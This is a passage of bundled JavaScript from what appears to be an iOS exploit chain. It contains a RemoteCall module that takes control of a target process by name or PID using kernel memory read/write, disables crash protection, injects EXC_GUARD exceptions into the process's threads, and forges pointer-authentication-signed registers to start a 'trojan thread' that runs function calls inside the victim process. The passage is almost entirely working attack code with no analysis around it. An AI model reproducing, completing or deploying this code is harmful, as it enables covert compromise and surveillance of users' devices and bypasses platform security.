  return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(previousPtr);
}
function _dumpPort(pAddr) {
  console.log(TAG, "dump port: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(pAddr));
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(pAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
  var buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
  var buff64 = new BigUint64Array(buff);
  for (var i = 0; i < 0x12; i++) console.log(TAG, "".concat(i, ": ").concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')));
}
function _dumpEntry(entryAddr) {
  console.log(TAG, "dump entry: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(entryAddr));
  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(entryAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
  var buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
  var buff64 = new BigUint64Array(buff);
  for (var i = 0; i < 3; i++) console.log(TAG, "".concat(i, ": ").concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')));
}


/***/ }),

/***/ "./libs/TaskRop/RegistersStruct.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return RegistersStruct; });
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }
var TAG = "REGISTERSSTRUCT";
var _dataView = /*#__PURE__*/new WeakMap();
var RegistersStruct = /*#__PURE__*/function () {
  function RegistersStruct(buffer) {
    var offset = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 0;
    var length = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : 29;
    _classCallCheck(this, RegistersStruct);
    _classPrivateFieldInitSpec(this, _dataView, void 0);
    _classPrivateFieldSet(_dataView, this, new DataView(buffer, offset, length * 8));
    this.length = length;
  }
  return _createClass(RegistersStruct, [{
    key: "get",
    value: function get(index) {
      if (index >= this.length || index < 0) {
        console.log(TAG, "Got wrong index in get:".concat(index));
        return;
      }
      return _classPrivateFieldGet(_dataView, this).getBigUint64(index * 8, true); // true for little-endian
    }
  }, {
    key: "set",
    value: function set(index, value) {
      if (index >= this.length || index < 0) {
        console.log(TAG, "Got wrong index in set");
        return;
      }
      _classPrivateFieldGet(_dataView, this).setBigUint64(index * 8, BigInt(value), true); // true for little-endian
    }
  }]);
}();


/***/ }),

/***/ "./libs/TaskRop/RemoteCall.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return RemoteCall; });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__("./libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__("./libs/Chain/Chain.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__("./libs/TaskRop/Task.js");
/* harmony import */ var _Thread__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__("./libs/TaskRop/Thread.js");
/* harmony import */ var _Exception__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__("./libs/TaskRop/Exception.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__("./libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__("./libs/TaskRop/ThreadState.js");
/* harmony import */ var _PAC__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__("./libs/TaskRop/PAC.js");
/* harmony import */ var _VM__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__("./libs/TaskRop/VM.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__("./libs/TaskRop/VMShmem.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__("./libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _PortRightInserter__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__("./libs/TaskRop/PortRightInserter.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateMethodInitSpec(e, a) { _checkPrivateRedeclaration(e, a), a.add(e); }
function _classPrivateFieldInitSpec(e, t, a) { _checkPrivateRedeclaration(e, t), t.set(e, a); }
function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }














//import ExceptionThreadJS17 from '!raw-loader!./ExceptionThread17.js'
//import ExceptionThreadJS18 from '!raw-loader!./ExceptionThread18.js'

//import Offsets from "Driver/Offsets";

var TAG = "REMOTECALL";
var GUARD_TYPE_MACH_PORT = 0x1n;
var kGUARD_EXC_INVALID_RIGHT = BigInt(1 << 8);
var SWITCH_OPTION_NONE = 0n;
var fakePCTrojanCreator = 0x101n;
var fakeLRTrojanCreator = 0x201n;
var fakePCTrojan = 0x301n;
var fakeLRTrojan = 0x401n;
var __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK = 0xff000000n;
var __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR = 0x2;
var __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC = 0x4;
var __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR = 0x8;
var SHMEM_CACHE_SIZE = 100;
var MAP_PRIVATE = 0x0002n;
var MAP_ANON = 0x1000n;
var _taskAddr = /*#__PURE__*/new WeakMap();
var _creatingExtraThread = /*#__PURE__*/new WeakMap();
var _firstExceptionPort = /*#__PURE__*/new WeakMap();
var _secondExceptionPort = /*#__PURE__*/new WeakMap();
var _firstExceptionPortAddr = /*#__PURE__*/new WeakMap();
var _secondExceptionPortAddr = /*#__PURE__*/new WeakMap();
var _dummyThread = /*#__PURE__*/new WeakMap();
var _dummyThreadMach = /*#__PURE__*/new WeakMap();
var _dummyThreadAddr = /*#__PURE__*/new WeakMap();
var _dummyThreadTro = /*#__PURE__*/new WeakMap();
var _selfThreadAddr = /*#__PURE__*/new WeakMap();
var _selfThreadCtid = /*#__PURE__*/new WeakMap();
var _trojanThreadAddr = /*#__PURE__*/new WeakMap();
var _callThreadAddr = /*#__PURE__*/new WeakMap();
var _originalState = /*#__PURE__*/new WeakMap();
var _vmMap = /*#__PURE__*/new WeakMap();
var _trojanMem = /*#__PURE__*/new WeakMap();
var _localPort = /*#__PURE__*/new WeakMap();
var _remotePort = /*#__PURE__*/new WeakMap();
var _shmemCache = /*#__PURE__*/new WeakMap();
var _success = /*#__PURE__*/new WeakMap();
var _threadList = /*#__PURE__*/new WeakMap();
var _krwControlFd = /*#__PURE__*/new WeakMap();
var _krwRwFd = /*#__PURE__*/new WeakMap();
var _pid = /*#__PURE__*/new WeakMap();
var _RemoteCall_brand = /*#__PURE__*/new WeakSet();
var RemoteCall = /*#__PURE__*/function () {
  function RemoteCall(param) {
    var _migFilterBypass = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : null;
    _classCallCheck(this, RemoteCall);
    _classPrivateMethodInitSpec(this, _RemoteCall_brand);
    _classPrivateFieldInitSpec(this, _taskAddr, void 0);
    _classPrivateFieldInitSpec(this, _creatingExtraThread, void 0);
    _classPrivateFieldInitSpec(this, _firstExceptionPort, void 0);
    _classPrivateFieldInitSpec(this, _secondExceptionPort, void 0);
    _classPrivateFieldInitSpec(this, _firstExceptionPortAddr, void 0);
    _classPrivateFieldInitSpec(this, _secondExceptionPortAddr, void 0);
    _classPrivateFieldInitSpec(this, _dummyThread, void 0);
    _classPrivateFieldInitSpec(this, _dummyThreadMach, void 0);
    _classPrivateFieldInitSpec(this, _dummyThreadAddr, void 0);
    _classPrivateFieldInitSpec(this, _dummyThreadTro, void 0);
    _classPrivateFieldInitSpec(this, _selfThreadAddr, void 0);
    _classPrivateFieldInitSpec(this, _selfThreadCtid, void 0);
    _classPrivateFieldInitSpec(this, _trojanThreadAddr, void 0);
    _classPrivateFieldInitSpec(this, _callThreadAddr, void 0);
    _classPrivateFieldInitSpec(this, _originalState, void 0);
    _classPrivateFieldInitSpec(this, _vmMap, void 0);
    _classPrivateFieldInitSpec(this, _trojanMem, void 0);
    _classPrivateFieldInitSpec(this, _localPort, void 0);
    _classPrivateFieldInitSpec(this, _remotePort, void 0);
    _classPrivateFieldInitSpec(this, _shmemCache, new Array(SHMEM_CACHE_SIZE));
    //#exceptionThreadCFString;
    _classPrivateFieldInitSpec(this, _success, false);
    _classPrivateFieldInitSpec(this, _threadList, []);
    _classPrivateFieldInitSpec(this, _krwControlFd, void 0);
    _classPrivateFieldInitSpec(this, _krwRwFd, void 0);
    _classPrivateFieldInitSpec(this, _pid, void 0);
    if (typeof param == "string") {
      console.log(TAG, "Getting task by name: ".concat(param));
      _classPrivateFieldSet(_taskAddr, this, _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param));
      //console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
    } else {
      console.log(TAG, "Getting task by pid: ".concat(param));
      _classPrivateFieldSet(_taskAddr, this, _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByPID(param));
      _classPrivateFieldSet(_pid, this, param);
      //console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
    }
    if (!_classPrivateFieldGet(_taskAddr, this)) {
      console.log(TAG, "Cannot get taskAddr, returning");
      return null;
    }

    /*
    let threadmMem = 0n;
    const buildVer = Offsets.getBuildVersion();
    if(buildVer && buildVer.startsWith("22"))
    {
    	threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
    	this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
    }
    else
    {
    	threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
    	this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
    }
    //Native.callSymbol("free", threadmMem);
    */

    var firstExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
    var secondExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
    if (!firstExceptionPort || !secondExceptionPort) {
      console.log(TAG, "Couldn't create exception ports");
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, firstExceptionPort, 0n, 0n);
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, secondExceptionPort, 0n, 0n);
      return null;
    }
    // Make sure the task won't crash after we handle an exception
    _Task__WEBPACK_IMPORTED_MODULE_3__["default"].disableExcGuardKill(_classPrivateFieldGet(_taskAddr, this));
    var guardCode = 0n;
    guardCode = _assertClassBrand(_RemoteCall_brand, this, _EXC_GUARD_ENCODE_TYPE).call(this, guardCode, GUARD_TYPE_MACH_PORT);
    guardCode = _assertClassBrand(_RemoteCall_brand, this, _EXC_GUARD_ENCODE_FLAVOR).call(this, guardCode, kGUARD_EXC_INVALID_RIGHT);
    guardCode = _assertClassBrand(_RemoteCall_brand, this, _EXC_GUARD_ENCODE_TARGET).call(this, guardCode, 0xf503n);
    var firstPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(firstExceptionPort);
    var secondPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(secondExceptionPort);
    //console.log(TAG,`Exception port 1:${Utils.hex(firstExceptionPort)} with kAddr:${Utils.hex(firstPortAddr)}`);
    //console.log(TAG,`Exception port 2:${Utils.hex(secondExceptionPort)} with kAddr:${Utils.hex(secondPortAddr)}`);

    var dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
    var dummyFunc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("getpid");
    //console.log(TAG,`dummyFunc:${Utils.hex(dummyFunc)}`);

    libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", dummyThread, null, dummyFunc, null);
    dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
    var dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", dummyThread));
    var dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(dummyThreadMach);
    var dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(dummyThreadAddr);
    var threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_thread_self"));
    var selfThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
    var selfThreadCtid = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getCtid(selfThreadAddr);

    //console.log(TAG,`Dummy thread:${Utils.hex(dummyThreadMach)}`);
    //console.log(TAG,`Dummy thread object:${Utils.hex(dummyThreadAddr)}`);
    //console.log(TAG,`Dummy thread tro:${Utils.hex(dummyThreadTro)}`);

    //console.log(TAG,`Self thread:${Utils.hex(threadSelf)}`);
    //console.log(TAG,`Self thread object:${Utils.hex(selfThreadAddr)}`);
    //console.log(TAG,`Guard exc code:${Utils.hex(guardCode)}`);
    //console.log(TAG,`Self thread ctid:${Utils.hex(selfThreadCtid)}`);

    _classPrivateFieldSet(_creatingExtraThread, this, true);
    _classPrivateFieldSet(_firstExceptionPort, this, firstExceptionPort);
    _classPrivateFieldSet(_secondExceptionPort, this, secondExceptionPort);
    _classPrivateFieldSet(_firstExceptionPortAddr, this, firstPortAddr);
    _classPrivateFieldSet(_secondExceptionPortAddr, this, secondPortAddr);
    _classPrivateFieldSet(_dummyThread, this, dummyThread);
    _classPrivateFieldSet(_dummyThreadMach, this, dummyThreadMach);
    _classPrivateFieldSet(_dummyThreadAddr, this, dummyThreadAddr);
    _classPrivateFieldSet(_dummyThreadTro, this, dummyThreadTro);
    _classPrivateFieldSet(_selfThreadAddr, this, selfThreadAddr);
    _classPrivateFieldSet(_selfThreadCtid, this, selfThreadCtid);
    var retryCount = 0;
    var validThreadCount = 0;
    var successThreadCount = 0;
    var firstThread = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(_classPrivateFieldGet(_taskAddr, this));
    var _currThread = firstThread;
    _classPrivateFieldSet(_trojanThreadAddr, this, firstThread);
    if (_migFilterBypass) _migFilterBypass.resume();
    while ( true && successThreadCount < 2 && validThreadCount < 5 && retryCount < 3) {
      var task = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(_currThread);
      if (!task) {
        if (!validThreadCount) {
          console.log(TAG, "failed on getting first thread at all, resetting first thread and currThread");
          firstThread = _currThread = _assertClassBrand(_RemoteCall_brand, this, _retryFirstThread).call(this, _migFilterBypass);
          retryCount++;
          continue;
        } else break;
      }
      //console.log(TAG,`Trying Inject EXC_GUARD on thread:${Utils.hex(currThread)} with tro task:${Utils.hex(task)}`);
      if (task == _classPrivateFieldGet(_taskAddr, this)) {
        if (!_assertClassBrand(_RemoteCall_brand, this, _setExceptionPortOnThread).call(this, _classPrivateFieldGet(_firstExceptionPort, this), _currThread, _migFilterBypass)) {
          console.log(TAG, "Set exception port on thread:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(_currThread), " failed, not injecting"));
          if (!validThreadCount) {
            console.log(TAG, "failed on first thread, resetting first thread and currThread");
            firstThread = _currThread = _assertClassBrand(_RemoteCall_brand, this, _retryFirstThread).call(this, _migFilterBypass);
            retryCount++;
            continue;
          }
        } else {
          // Inject a EXC_GUARD exception on this thread
          if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].injectGuardException(_currThread, guardCode)) {
            console.log(TAG, "Inject EXC_GUARD on thread:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(_currThread), " failed, not injecting"));
            if (!validThreadCount) {
              console.log(TAG, "failed on first thread, resetting first thread and currThread");
              firstThread = _currThread = _assertClassBrand(_RemoteCall_brand, this, _retryFirstThread).call(this, _migFilterBypass);
              retryCount++;
              continue;
            }
          } else {
            successThreadCount++;
            _classPrivateFieldGet(_threadList, this).push(_currThread);
            console.log(TAG, "Inject EXC_GUARD on thread:".concat(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(_currThread), " OK"));
          }
        }
        validThreadCount++;
      } else if (task && !validThreadCount) {
        console.log(TAG, "Got weird tro on first thread, resetting first thread and currThread");
        firstThread = _currThread = _assertClassBrand(_RemoteCall_brand, this, _retryFirstThread).call(this, _migFilterBypass);
        retryCount++;
        continue;
      }
      var next = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].next(_currThread);
      if (!next) {
        if (!validThreadCount) {
          console.log(TAG, "Got empty next thread on first thread. Retry");
          firstThread = _currThread = _assertClassBrand(_RemoteCall_brand, this, _retryFirstThread).call(this, _migFilterBypass);
          retryCount++;
          continue;
        } else {
          console.log(TAG, "Break because of empty next thread");
          break;
        }
      }
      _currThread = next;
    }
    if (_migFilterBypass) _migFilterBypass.pause();
    console.log(TAG, "Valid threads: ".concat(validThreadCount));
    console.log(TAG, "Injected threads: ".concat(successThreadCount));
    if (!_classPrivateFieldGet(_threadList, this).length) {
      console.log(TAG, "Exception injection failed. Aborting.");
      this.destroy();
      return null;
    }
    var _excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
    // Since we are in background, we don't mind to wait a lot!
    if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_firstExceptionPort, this), _excBuffer, 120000, false)) {
      console.log(TAG, "Failed to receive first exception");
      this.destroy();
      return null;
    }

    //console.log(TAG,`Got first exception succesfully`);
    var _excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(_excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
    var _exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](_excRes);
    // Save state to restore its execution after trojan thread creation TODO make it inside ThreadState to copy thread state to another variable
    var originalStateBuff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64_SIZE);
    _classPrivateFieldSet(_originalState, this, new _ThreadState__WEBPACK_IMPORTED_MODULE_7__["default"](originalStateBuff));
    for (var i = 0; i < 29; i++) {
      _classPrivateFieldGet(_originalState, this).registers.set(i, _exc.threadState.registers.get(i));
    }
    _classPrivateFieldGet(_originalState, this).opaque_fp = _exc.threadState.opaque_fp;
    _classPrivateFieldGet(_originalState, this).opaque_lr = _exc.threadState.opaque_lr;
    _classPrivateFieldGet(_originalState, this).opaque_sp = _exc.threadState.opaque_sp;
    _classPrivateFieldGet(_originalState, this).opaque_pc = _exc.threadState.opaque_pc;
    _classPrivateFieldGet(_originalState, this).cspr = _exc.threadState.cspr;
    _classPrivateFieldGet(_originalState, this).opaque_flags = _exc.threadState.opaque_flags;

    //console.log(TAG,`Clear EXC_GUARD from all other threads...`);

    for (var _i = 0; _i < _classPrivateFieldGet(_threadList, this).length; _i++) {
      _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(_classPrivateFieldGet(_threadList, this)[_i]);
      //console.log(TAG,`Clear EXC_GUARD on thread:${Utils.hex(this.#threadList[i])} OK`);
    }
    console.log(TAG, "Finish clearing EXC_GUARD from all other threads...");
    var desiredTimeout = 1500;
    // Flush exceptions in other threads (is that really needed?)
    while (true) {
      var excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(_classPrivateFieldGet(_firstExceptionPort, this), excBuffer, desiredTimeout, false)) break;
      var excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer, Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
      var exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
      //threadClearGuardException(remoteCall->trojanThreadAddr);
      _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, exc.threadState, false);
    }
    //console.log(TAG,`finished flushing exceptions`);
    var _newState = _exc.threadState;
    //console.log(TAG,`gadget_pacia:${Utils.hex(PAC.gadget_pacia)}`);
    _newState = _assertClassBrand(_RemoteCall_brand, this, _signState).call(this, firstThread, _newState, fakePCTrojanCreator, fakeLRTrojanCreator);
    //console.log(TAG,`updated PC:${Utils.hex(newState.opaque_pc)} and LR:${Utils.hex(newState.opaque_lr)}`);
    _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(_exc, _newState, false);
    //console.log(TAG,`Trojan thread created`);

    //console.log(TAG,`Test remote getpid()`);
    //let pidRemote = this.#doRemoteCallTemp(100, "getpid");
    //console.log(TAG,`pidRemote:${pidRemote}`);

    // Use stack as a temporary remote memory
    var trojanMemTemp = _exc.threadState.opaque_sp & 0x7fffffffffn;
    //console.log(TAG,`Remote memory:${Utils.hex(trojanMemTemp)}`);

    // Substracting a bit from stack pointer to not corrupt original stack
    trojanMemTemp = trojanMemTemp - 0x100n;
    _classPrivateFieldSet(_vmMap, this, _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getMap(_classPrivateFieldGet(_taskAddr, this)));
    //console.log(TAG,`vmMap:${Utils.hex(this.#vmMap)}`);

    // Create a remote pthread that should always crash on first execution, so we can control it with exceptions.
    var remoteCrashSigned = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(_classPrivateFieldGet(_trojanThreadAddr, this), fakePCTrojan, 0n);
    //console.log(TAG,`remoteCrashSigned:${Utils.hex(remoteCrashSigned)}`);

    var ret = _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallTemp).call(this, 100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
    //console.log(TAG,`pthread_create_suspended_np:${Utils.hex(ret)}`);
    //VM.mocker(0x221d54,0xffffffdc08875500n);

    var pthreadAddr = this.read64(BigInt(trojanMemTemp));
    //console.log(TAG,`pthreadAddr:${Utils.hex(pthreadAddr)}`);

    // Get mach port of the new thread and set exception port on it.
    var callThreadPort = _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallTemp).call(this, 100, "pthread_mach_thread_np", pthreadAddr);
    //console.log(TAG,`Call thread port:${Utils.hex(callThreadPort)}`);

    if (callThreadPort == 0n) {
      console.log(TAG, "Cannot find callThreadPort");
      this.destroy();
      return null;
    }
    _classPrivateFieldSet(_callThreadAddr, this, _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObjectOfTask(_classPrivateFieldGet(_taskAddr, this), BigInt(callThreadPort)));
    //console.log(TAG,`Call thread addr:${Utils.hex(this.#callThreadAddr)}`);
    // Note that this exception port is not the same of the initial exception port we use for existing threads.

    if (_migFilterBypass) _migFilterBypass.resume();
    if (!_assertClassBrand(_RemoteCall_brand, this, _setExceptionPortOnThread).call(this, _classPrivateFieldGet(_secondExceptionPort, this), _classPrivateFieldGet(_callThreadAddr, this), _migFilterBypass)) {
      console.log(TAG, "Failed to set new exception port on newly created thread, trying one more time before giving up, creating new thread");
      dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np", dummyThread, null, dummyFunc, null);
      dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
      _classPrivateFieldSet(_dummyThreadMach, this, BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np", dummyThread)));
      _classPrivateFieldSet(_dummyThreadAddr, this, _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(_classPrivateFieldGet(_dummyThreadMach, this)));
      _classPrivateFieldSet(_dummyThreadTro, this, _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(_classPrivateFieldGet(_dummyThreadAddr, this)));
      libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", 1n);
      if (!_assertClassBrand(_RemoteCall_brand, this, _setExceptionPortOnThread).call(this, _classPrivateFieldGet(_secondExceptionPort, this), _classPrivateFieldGet(_callThreadAddr, this), _migFilterBypass)) {
        if (_migFilterBypass) _migFilterBypass.pause();
        this.destroy();
        return null;
      }
    }
    if (_migFilterBypass) _migFilterBypass.pause();
    console.log(TAG, "All good so far! Now we resume trojan thread...");

    // Ok, now we are ready to start this thread and catch exceptions on it.
    ret = _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallTemp).call(this, 100, "thread_resume", callThreadPort);
    //console.log(TAG,`thread_resume():${ret}`);
    if (ret !== 0n) {
      console.log(TAG, "Couldn't resume newly created thread, falling back to use original one only");
      _classPrivateFieldSet(_creatingExtraThread, this, false);
    }
    if (_classPrivateFieldGet(_creatingExtraThread, this)) {
      console.log(TAG, "New thread created succesfully, resuming original");
      _assertClassBrand(_RemoteCall_brand, this, _restoreTrojanThread).call(this, _classPrivateFieldGet(_originalState, this));
    }
    console.log(TAG, "Original thread restored succesfully");

    // From this point on, the "stable" trojan thread is ready to process calls.
    //console.log(TAG, `Original thread restored succesfully, testing getpid on stable primitive`);
    _classPrivateFieldSet(_pid, this, _assertClassBrand(_RemoteCall_brand, this, _doRemoteCallStable).call(this, 100, "getpid"));
    console.log(TAG, "Task pid: ".concat(_classPrivateFieldGet(_pid, this)));

    //this.#trojanMem = trojanMemTemp;
    //this.#testRWPrim();

    // Allocate a general purpose remote page mem.
